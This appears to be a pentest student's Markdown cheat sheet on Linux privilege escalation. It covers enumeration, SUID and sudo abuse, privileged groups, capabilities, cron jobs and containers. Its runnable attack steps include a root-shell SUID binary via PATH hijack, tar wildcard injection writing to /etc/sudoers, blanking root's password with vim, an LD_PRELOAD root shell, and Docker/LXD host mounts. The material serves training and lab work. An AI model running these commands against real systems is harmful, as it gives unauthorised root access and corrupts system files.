# Linux Privilege Escalation
- [Enumeration](#Enumeration)
    - [Find Commands](#find-commands)
    - [Network](#network)
- [Environment-Based Privilege Escalation](#environment-based-privilege-escalation)
    - [PATH Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
- [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
    - [SUID (Special Permissions)](#suid-special-permissions)
    - [SUDO Abuse](#sudo-abuse)
    - [Privileged Group](#privileged-groups)
        - [LXC / LXD](#lxc--lxd)
        - [Docker](#docker)
        - [Disk](#disk)
        - [ADM](#adm)
    - [Capabilities](#capabilities)
- [Service-based Privilege Escalation](#service-based-privilege-escalation)
    - [Vulnerable Services](#vulnerable-services)
    - [Cron Job Abuse](#cron-job-abuse)
    - [Containers](#containers)
        - [Linux Daemon - LXD](#linux-daemon---lxd)
        - [Docker](#docker-1)
        - [Kubernetes](#kubernetes)


## Enumeration
- [ ] `hostname`
- [ ] `uname -a`
- [ ] Information about the processes and the target: `cat /proc/version` `/etc/issue` `/etc/os-release`
- [ ] login shells exits `cat /etc/shells`
- [ ] Mounted and unmounted drives `cat /etc/fstab`
- [ ] Discover users on the system: `cat /etc/passwd` >> to beautify output `cat /etc/passwd | cut -d ":" -f 1`
- [ ] `cat /etc/group`
- [ ] Unmounted File Systems `cat /etc/fstab | grep -v "#" | column -t`
- [ ] `ls` `id` 
- [ ] List all binaries `ls -l /bin /usr/bin/ /usr/sbin/`
- [ ] `lsblk` enumerate information about block devices on the system
- [ ] `lpstat` found information about any printers in the system
- [ ] Temp files `ls -l /tmp /var/tmp /dev/shm`
- [ ] Check for any cron jobs on the system.`ls -la /etc/cron.daily/`
- [ ] User's last login `lastlog`
- [ ] CPU type/version `lscpu`
- [ ] All processes running on the target: `ps -A` , Process tree: `ps axjf`
- [ ] Environment variables `env`
- [ ] List all commands your user can run using sudo `sudo -l` and check whether sudo version is vulnerable or not `sudo -V`
- [ ] `df -h` mounted file systems
- [ ] Check if anyone else is currently on the system with us `who` `finger`
>[!NOTE]
> Search about pattern in files `grep -ri -l 'your-pattern-here' / 2>/dev/null`

- [ ] Finding history file `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`
- [ ] Show all hidden files `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null`
- [ ] Show all hidden directories `find / -type d -name ".*" -ls 2>/dev/null`
- [ ] Search about proc file system `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`
- [ ] Search about Configuration files `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
- [ ] Search about scripts on the system `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
- [ ] `history`
> [!TIP]
>    - Create a list of installed packages to work with `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
>   - Compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.
    ```
    for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | grep -E '^[a-zA-Z0-9_]+$'); do 
        if grep -q "$i" installed_pkgs.list; then 
            echo "Check GTFO for: $i"; 
        fi
    done
    ```
- [ ] strace on Linux-based operating systems to track and analyze system calls and signal processing.`strace ping -c1 10.129.112.20`

- Credential Hunting
    - [ ] `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`

### find Commands
- `find . -name flag1.txt` search about flag1.txt in the current directory
- `find / -type d -name config` find the directory named config under "/"
- `find / -type f -perm 0777` find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x` find executable files
- `find /home -user frank` find all files for user "frank" under "/home"
- `find / -mtime 10` find files that were modified in the last 10 days
- `find / -atime 10` find files that were accessed in the last 10 day
- `find / -cmin -60` find files changed within the last hour (60 minutes)
- `find / -amin -60` find files accesses within the last hour (60 minutes)
- `find / -size 50M` find files with a 50 MB size
- `find / -name gcc*`
- Folders and files that can be written to or executed from:
    - `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
### Network 
- [ ] `ifconfig`
- [ ] `ip route`
- [ ] `ls -l ~/.ssh`
- [ ] `cat /etc/resolv.conf` `/etc/hosts`
- Netstat Commands
    - `netstat -a`: Shows all listening ports and established connections.
    - `netstat -l`: list ports in "listening" mode. 
    - `netstat -s`: list network usage statistics by protocol.
    - `netstat -tp`: list connections with the service name and PID information.
    - `netstat -i`: Shows interface statistics. 
    - `netstat -ano` could be broken down as follows:
        -a: Display all sockets
        -n: Do not resolve names
        -o: Display timers

## Environment-Based Privilege Escalation
### PATH Abuse
- [ ] `echo $PATH`

- Adding malicious script to PATH
    - Steps:
    1. Make file path_exp.c
    ```
    #include<unistd.h>
    void main()
    { setuid(0);
    setgid(0); 
    system("love");
    }
    ```
    2. We compile this into an executable and set the SUID bit. 
        - `gcc path_exp.c -o path -w`
        - `chmod u+s path`
    3. A simple search for writable folders can done using the  `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` . The folder that will be easier to write to is probably /tmp. In almost cases; because /tmp is not present in PATH so we will need to add it. the `export PATH=/tmp:$PATH` command accomplishes this.
    4. 
    - `cd /tmp`
    - `echo "/bin/bash" > love`
    - `chmod 777 love`
    - `./path`

### Wildcard Abuse
- Vulnerable cronjob e.g. `*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *`
- Creating malicious files so I can use it as options to tar command.
```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### Escaping Restricted Shells
- Command Injection: 
```
ls -l `id`
```
 this command would cause the ls command to be executed with the argument -l, followed by the output of the id command.

- Command Substitution: this involves using the shell's command substitution syntax to execute a command.
```
echo $(<file.txt)
```

- Command Chaining: semicolon(;) or vertical bar(|) ....etc
- Environment Variables: modify or create environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: the shell allows users to define and call shell functions,it may be possible to escape from the shell by defining a shell function that executes a command.

## Permissions-based Privilege Escalation
### SUID (Special Permissions)

- `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
- `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
- `find / -uid 0 -perm -6000 -type f 2>/dev/null`
 

### SUDO Abuse

- The sudo command, by default, allows you to run a program with root privileges.
- Any user can check its current situation related to root privileges using the `sudo -l` command. 

### Privileged Groups

#### LXC / LXD
- LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group.Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root.
- Steps:
    -  `lxd init`
    - Import the local image `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
    - Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host. `lxc init alpine r00t -c security.privileged=true`
    - Mount the host file system `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
    - Spawn a shell inside the container instance ` lxc start r00t` `lxc exec r00t /bin/sh`
#### Docker
- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`.

#### Disk 
- Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

#### ADM
- Members of the adm group are able to read all logs stored in `/var/log`.

### Capabilities
- enumerate all existing capabilities for all existing binary executables on a Linux system
    - `getcap -r / 2>/dev/null`
    - `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` 

- e.g.
```  
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```
- We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file
```
/usr/bin/vim.basic /etc/passwd
```
- make these changes in a non-interactive mode: ` echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`

## Service-based Privilege Escalation

### Vulnerable Services
- Many services may be found, which have flaws that can be leveraged to escalate privileges.

### Cron Job Abuse
- the cron file created in `/var/spool/cron`.
- [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges.We can use it to see commands run by other users, cron jobs, etc.
```
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000
```

### Containers
#### Linux Daemon - LXD
- We must be in either the lxc or lxd group. e.g.
```
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
- Import the image: `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`
-  we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
-
 ```
lxc start privesc
lxc exec privesc /bin/bash 
```

#### Docker 
- Run container and spawn shell
```
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
- [ ] Check whether docker socket is writable .The socket located in `/var/run/docker.sock`
- `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`

#### Kubernetes







### Leverage LD_PRELOAD
- LD_PRELOAD is a function that allows any program to use shared libraries.
- If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.
- The steps of this privilege escalation vector can be summarized as follows:

    1. Check for LD_PRELOAD (with the env_keep option)
    2. Write a simple C code compiled as a share object (.so extension) file
    3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

- We can now use this shared object file when launching any program our user can run with sudo. In our case ,Apache2, find, or almost any of the programs we can run with sudo can be used.

- We need to run the program by specifying the LD_PRELOAD option, as follows:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`



## Automated Tools 
-   LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-   LinEnum: https://github.com/rebootuser/LinEnum
-   LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-   Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-   Linux Priv Checker: https://github.com/linted/linuxprivchecker 
# Resources 
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://gtfobins.github.io/
- [Escape from Restricted Shells](https://0xffsec.com/handbook/shells/restricted-shells/)
- [SUID](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
- [Bash one-liner reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
